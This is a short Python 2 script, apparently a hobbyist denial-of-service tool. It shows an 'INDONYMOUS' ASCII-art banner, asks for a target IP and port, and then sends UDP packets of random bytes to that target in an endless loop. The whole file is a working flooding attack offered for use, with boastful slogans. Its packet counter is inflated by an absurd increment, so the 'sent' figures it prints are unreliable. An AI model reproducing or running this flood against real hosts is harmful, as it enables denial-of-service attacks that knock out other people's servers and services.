

import sys
import os
import time
import socket
import random
#TIMES
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
##

os.system("clear")
os.system("figlet I N D O N Y M O U S")


print """\033[31;1m
         `/ymMMMMMMMMMMMMMMmy/`
       /hMMMMMMMMMMMMMMMMMMMMMMh/
     /mMMmNMMMMMNNNNNNNNMMMMMNNMMm/
   `hNmo:dMMNNNmNNmNNmNNmNNNMMd:omNh`
  .mh:+/hMNNNNmNNmNdhmmNNmNNNNMy/o:hm.
 `d+://sNmMMMmMMMmdy+/mMMMmMMMmNs///+d`
 ys.o/oMmNNNmNNMNNMmdMNNMNNmNNNmMo/o.ys
`my.-/NmMMMMmMMNmNNyyNNmNMMmMMMMmN/:`ym`
-h/+s/MmMMMNmNNNdym++mymNNNmNMMNmM:so/h-
-N.o.sMmMMMNh/:-`-Mo\033[37;1msM-`-:/hNMMMmMs.+.N-
`ho/-ohmMMMM/    -M/+M.    /MMMMmho-/oh
 s+-s-odmNNN`     /-:/     .NNNmd+:s-+s
 `mo/-:+ymMm                mMms+:-/om`
  .h/+/y`hhs                yyh`y/+/h.
   `hd/::-+.                .+-::/dy`
     /hs+/::.--          --.::/+sh:
       :hds+/-`          `-/+sdh:
         `/ymM+          oMmy/"""
print "\033[32;1mWELCOME TO Crazy ATTACKER DDOS LEVEL-1"
print "\033[31;1mWE FIGHT EVIL !"
print "\033[32;1mWE NEVER GIVE UP"
print "\033[32;1mFROM ZERO TO HERO"
print "\033[31;1mDONT FORGIVE YOUR ENEMY"
print "\033[32;1mTHANKS FOR YOUR SUPPORT ^_^"
print "\033[31;1mThanks To : Rief"
ip = raw_input("Target's IP = ")
port = input("Ports = ")

os.system("clear")
print "WAIT FOR 5 SECONDS FOR BEGIN THE ATTACKS !"
time.sleep(5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 10000000000000
     port = port + 0
     print "\033[31;1mAttacking The Server ! %s %s port:%s "%(sent,ip,port)
     if port == 65534:
       port = 0
